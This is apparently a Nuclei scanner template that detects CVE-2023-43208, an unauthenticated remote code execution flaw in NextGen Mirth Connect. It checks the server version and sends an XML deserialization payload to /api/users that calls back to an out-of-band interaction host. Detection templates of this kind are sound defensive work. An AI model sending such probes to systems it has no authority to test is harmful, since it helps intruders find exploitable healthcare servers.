id: CVE-2023-43208
info:
  name: NextGen Mirth Connect - Remote Code Execution Vulnerability
  author: iamnoooob,rootxharsh,pdresearch
  severity: critical
  description: |
    Mirth Connect, by NextGen HealthCare, is an open source data integration platform widely used by healthcare companies. Versions prior to 4.4.1 are vulnerable to an unauthenticated remote code execution vulnerability
  reference:
    - https://www.horizon3.ai/nextgen-mirth-connect-remote-code-execution-vulnerability-cve-2023-43208/

http:
  - raw:
      - |
        GET /api/server/version HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Accept-Language: en-US;q=0.9,en;q=0.8
        X-Requested-With: OpenAPI
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
        Connection: close
        Cache-Control: max-age=0

      - |
        POST /api/users HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Accept-Language: en-US;q=0.9,en;q=0.8
        X-Requested-With: OpenAPI
        Content-Type: application/xml
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
        Connection: close
        Cache-Control: max-age=0
        Content-Length: 164

        <map>
            <entry>
                <java.net.URL>http://{{interactsh-url}}</java.net.URL>
                <string>string</string>
            </entry>
        </map>

    extractors:
      - type: regex
        part: body_1
        internal: true
        name: detected_version
        group: 1
        regex:
          - '(.*)'

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'compare_versions(detected_version, "<4.4.1") && contains(interactsh_protocol, "dns") && status_code_1 == 200 && status_code_2 == 401'
